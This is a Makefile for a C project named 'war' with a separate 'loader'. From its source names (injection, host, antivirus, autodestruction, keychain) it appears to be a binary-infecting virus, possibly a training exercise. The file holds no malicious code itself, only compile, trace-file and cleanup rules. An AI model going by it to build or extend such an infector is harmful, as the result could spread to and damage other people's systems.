NAME = war 
LOAD = loader

SRC_WAR_PATH = src_war
OBJ_WAR_PATH = obj_war

SRC_LOAD_PATH = src_load
OBJ_LOAD_PATH = obj_load

TRACE_PATH=/tmp/trace

INC_PATH = inc

SRC_WAR_NAME =				\
		main.c			\
		__entry.c		\
					\
		antivirus.c		\
		init.c			\
		find.c			\
		host.c			\
		criteria.c		\
		text.c			\
		note.c			\
		header.c		\
		injection.c		\
		autodestruction.c	\
		execution.c		\
					\
		keychain.c		\
		syscall.c		\
		tools.c			\
					\
		__exit.c		\

SRC_LOAD_NAME =				\
		loader.c		\

OBJ_WAR_NAME = $(SRC_WAR_NAME:.c=.o)
OBJ_LOAD_NAME = $(SRC_LOAD_NAME:.c=.o)

CC = gcc 
CFLAGS = -Wall -Wextra -Werror -masm=intel -D DEBUG

RED=\033[1;31m
GREEN=\033[1;32m
NC=\033[0m

SRC_WAR = $(addprefix $(SRC_WAR_PATH)/,$(SRC_WAR_NAME))
OBJ_WAR = $(addprefix $(OBJ_WAR_PATH)/,$(OBJ_WAR_NAME))

SRC_LOAD = $(addprefix $(SRC_LOAD_PATH)/,$(SRC_LOAD_NAME))
OBJ_LOAD = $(addprefix $(OBJ_LOAD_PATH)/,$(OBJ_LOAD_NAME))

.PHONY: all, clean, fclean, re

all: $(NAME) $(LOAD)

################################################################################
### WAR
################################################################################

$(NAME): $(OBJ_WAR)
	@$(CC) $(CFLAGS) $^ -o $@

$(OBJ_WAR_PATH)/%.o: $(SRC_WAR_PATH)/%.c Makefile
	@mkdir $(OBJ_WAR_PATH) 2> /dev/null || true
	@$(CC) $(CFLAGS) -c $< -o $@ -I$(INC_PATH)
	@echo "$(GREEN)[✓]$(NC) Source compiled : $<"
	@touch $(TRACE_PATH)
	@chmod 666 $(TRACE_PATH)

################################################################################
### LOAD
################################################################################

$(LOAD): $(OBJ_LOAD)
	@$(CC) $(CFLAGS) $^ -o $@

$(OBJ_LOAD_PATH)/%.o: $(SRC_LOAD_PATH)/%.c Makefile
	@mkdir $(OBJ_LOAD_PATH) 2> /dev/null || true
	@$(CC) $(CFLAGS) -c $< -o $@ -I$(INC_PATH)
	@echo "$(GREEN)[✓]$(NC) Source compiled : $<"

clean:
	@rm -f $(OBJ_WAR) $(OBJ_LOAD)
	@rmdir $(OBJ_WAR_PATH) $(OBJ_LOAD_PATH) 2> /dev/null || true
	@echo "$(RED)[-]$(NC) Objects cleaned"

fclean: clean
	@rm -rf $(NAME) $(LOAD)
	@echo "$(RED)[-]$(NC) Program clear"
	@rm -f $(TRACE_PATH)

re: fclean
	@make

